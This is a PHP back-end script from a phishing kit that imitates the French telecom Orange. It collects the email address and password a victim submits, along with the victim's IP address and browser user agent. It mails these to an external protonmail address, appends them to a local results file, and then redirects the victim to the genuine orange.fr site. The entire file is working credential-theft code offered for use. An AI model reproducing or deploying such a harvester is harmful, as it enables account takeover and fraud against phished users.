<?php
session_start();
include "inc/pageCommands.php";
header('Content-Type: application/json');
$urlto="panel.php";
$arr["session"]=$_SESSION;
$arr["data"]=$_POST;
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message = "
Email    : ".$_POST['email']."
Password : ".$_POST['password']."
USER-AGENT * :$_SERVER[HTTP_USER_AGENT]\n
ip :$ip\n====================================\n";
$send = "prof5761@protonmail.com";
$subject = "RIO[Orange] $ip";
$headers = "From: [Orange]<info@online.net>";
mail($send,$subject,$message,$headers);
$monfichier = fopen('./all/rslt.txt', 'a+');
$pages_vues = fgets($monfichier);
fputs($monfichier, $message."\n");
fclose($monfichier);
header("location:https://www.orange.fr/=");